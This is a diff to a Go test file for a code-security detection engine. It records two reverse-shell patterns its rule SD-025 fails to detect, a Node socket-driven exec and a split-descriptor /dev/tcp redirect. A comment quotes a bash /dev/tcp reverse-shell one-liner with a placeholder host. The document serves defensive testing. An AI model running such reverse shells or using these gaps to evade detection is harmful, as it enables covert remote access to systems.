@@ -121,9 +121,14 @@ var adversarialCases = []adversarialCase{
 // The reverse-shell gap this list used to record — `bash -i >& /dev/tcp/HOST/PORT`,
 // the python `socket…pty.spawn` one-liner, the perl `Socket`+`exec` one-liner —
 // is closed: SD-025 now detects all three (and more; see the revshell-* and
-// control-* entries in adversarialCases above). The list is empty until the
-// next shape this engine can't see is found and committed here.
-var uncoveredShapes = []adversarialCase{}
+// control-* entries in adversarialCases above). Two narrower SD-025 gaps
+// remain and are recorded below; see ADR-0009.
+var uncoveredShapes = []adversarialCase{
+	{dir: "revshell-node-execvar", axis: axes.Security, atMost: "A",
+		why: "reRevShellExec matches only literal shell tokens; a socket-derived exec (child_process.exec(data)) has no /bin/sh literal, so the PAIR carrier's shell half is unrecognised — a known gap, see ADR-0009."},
+	{dir: "revshell-devtcp-splitfd", axis: axes.Security, atMost: "A",
+		why: "SELF recognises only >&, <>, 0>&1 etc. on /dev/tcp (plain >/< are omitted to spare benign port probes), and /dev/tcp is not a PAIR socket signal — a known gap, see ADR-0009."},
+}
 
 func TestAdversarial_UncoveredShapes(t *testing.T) {
 	reg := rules.DefaultRegistry()
